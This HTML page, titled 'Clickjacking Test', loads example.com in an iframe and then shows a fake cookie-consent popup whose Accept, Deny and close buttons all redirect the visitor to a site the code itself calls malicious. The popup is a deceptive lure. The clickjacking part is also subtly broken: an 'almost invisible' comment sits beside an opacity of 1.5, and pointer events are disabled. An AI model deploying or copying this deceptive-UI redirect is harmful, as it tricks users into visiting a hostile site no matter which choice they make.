<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking Test</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        /* Hidden iframe loading the target website */
        .hidden-iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 1.5;  /* Almost invisible */
            pointer-events: none;
            z-index: 1;
        }

        /* Background blur effect */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(3px);
            display: none;
            z-index: 9998;
        }

        /* Fake Cookie Popup */
        .cookie-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
            z-index: 9999;
            text-align: center;
            width: 450px;
            font-size: 15px;
            border: 1px solid #ddd;
            display: none; /* Hidden by default */
            opacity: 0;
            animation: fadeIn 0.8s ease-in-out forwards;
        }

        .cookie-popup p {
            margin: 0 0 10px;
            font-size: 16px;
            color: #333;
        }

        .cookie-popup a {
            color: #0073e6;
            text-decoration: none;
            font-weight: bold;
        }

        /* Fake Close Button */
        .close-btn {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 18px;
            cursor: pointer;
            font-weight: bold;
            color: #888;
            transition: color 0.3s ease;
        }

        .close-btn:hover {
            color: red;
        }

        /* Buttons */
        .cookie-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 12px;
        }

        .cookie-button {
            padding: 10px 18px;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            font-weight: bold;
            transition: background 0.3s ease, transform 0.1s ease-in-out;
        }

        .accept {
            background: #0073e6;
            color: white;
        }

        .accept:hover {
            background: #005bb5;
        }

        .deny {
            background: #e0e0e0;
            color: #333;
        }

        .deny:hover {
            background: #c7c7c7;
        }

        .cookie-button:active {
            transform: scale(0.95);
        }

        /* Cursor trick - makes entire popup feel clickable */
        .cookie-popup:hover {
            cursor: pointer;
        }

        /* Fade-in animation */
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translate(-50%, -55%);
            }
            to {
                opacity: 1;
                transform: translate(-50%, -50%);
            }
        }

        /* Fade-out animation */
        @keyframes fadeOut {
            from {
                opacity: 1;
            }
            to {
                opacity: 0;
            }
        }

    </style>
</head>
<body>

    <!-- Target website in an invisible iframe -->
    <iframe src="https://www.example.com/" class="hidden-iframe"></iframe>

    <!-- Overlay background blur -->
    <div class="overlay" id="overlay"></div>

    <!-- Fake Cookie Consent Popup -->
    <div class="cookie-popup" id="cookie-popup">
        <span class="close-btn" onclick="redirect()">✖</span>
        <p>We use cookies to enhance your experience. By clicking Accept, you agree to our <a href="#">Privacy Policy</a>.</p>
        <div class="cookie-buttons">
            <button class="cookie-button accept" onclick="redirect()">Accept</button>
            <button class="cookie-button deny" onclick="redirect()">Deny</button>
        </div>
    </div>

    <script>
        // Show cookie popup after delay
        setTimeout(() => {
            document.getElementById("overlay").style.display = "block";  // Show blurred background
            document.getElementById("cookie-popup").style.display = "block";
        }, 3000); // Appears after 3 seconds

        function redirect() {
            let popup = document.getElementById("cookie-popup");
            let overlay = document.getElementById("overlay");

            // Fade out before redirecting
            popup.style.animation = "fadeOut 0.5s ease-in-out forwards";
            overlay.style.animation = "fadeOut 0.5s ease-in-out forwards";
            
            setTimeout(() => {
                window.location.href = "https://malwarekid.github.io"; // Redirect to malicious site
            }, 700); // Redirect after 0.7s
        }
    </script>

</body>
</html>
